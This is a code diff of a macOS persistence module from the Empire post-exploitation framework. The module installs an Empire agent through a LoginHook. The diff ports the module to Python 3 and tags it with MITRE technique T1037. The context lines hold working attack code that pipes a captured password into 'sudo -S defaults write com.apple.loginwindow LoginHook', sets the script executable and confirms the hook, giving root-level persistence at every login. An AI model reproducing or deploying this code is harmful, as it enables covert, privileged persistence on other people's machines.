@@ -1,4 +1,5 @@
-class Module:
+from builtins import object
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -12,6 +13,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': ('Installs Empire agent via LoginHook.'),
+
+            'Software': '',
+
+            'Techniques': ['T1037'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -88,34 +93,34 @@ try:
     result = process.communicate()
     result = result[0].strip()
     if str(result) != "1":
-        print "[!] ERROR to create a LoginHook requires (sudo) privileges!"
+        print("[!] ERROR to create a LoginHook requires (sudo) privileges!")
         sys.exit()
     try:
-        print " [*] Setting script to proper linux permissions"
+        print(" [*] Setting script to proper linux permissions")
         process = subprocess.Popen('chmod +x %s', stdout=subprocess.PIPE, shell=True)
         process.communicate()
     except Exception as e:
-        print "[!] Issues setting login hook (line 81): " + str(e)
+        print("[!] Issues setting login hook (line 81): " + str(e))
 
-    print " [*] Creating proper LoginHook"
+    print(" [*] Creating proper LoginHook")
 
     try:
         process = subprocess.Popen('echo "%s" | sudo -S defaults write com.apple.loginwindow LoginHook %s', stdout=subprocess.PIPE, shell=True)
         process.communicate()
     except Exception as e:
-        print "[!] Issues setting login hook (line 81): " + str(e)
+        print("[!] Issues setting login hook (line 81): " + str(e))
 
     try:
         process = subprocess.Popen('echo "%s" | sudo -S defaults read com.apple.loginwindow', stdout=subprocess.PIPE, shell=True)
-        print " [*] LoginHook Output: "
+        print(" [*] LoginHook Output: ")
         result = process.communicate()
         result = result[0].strip()
-        print " [*] LoginHook set to:"
-        print str(result)
+        print(" [*] LoginHook set to:")
+        print(str(result))
     except Exception as e:
-        print "[!] Issue checking LoginHook settings (line 86): " + str(e)
+        print("[!] Issue checking LoginHook settings (line 86): " + str(e))
 except Exception as e:
-    print "[!] Issue with LoginHook script: " + str(e)
+    print("[!] Issue with LoginHook script: " + str(e))
 
 """ % (loginhookScriptPath, password, loginhookScriptPath, password)
 
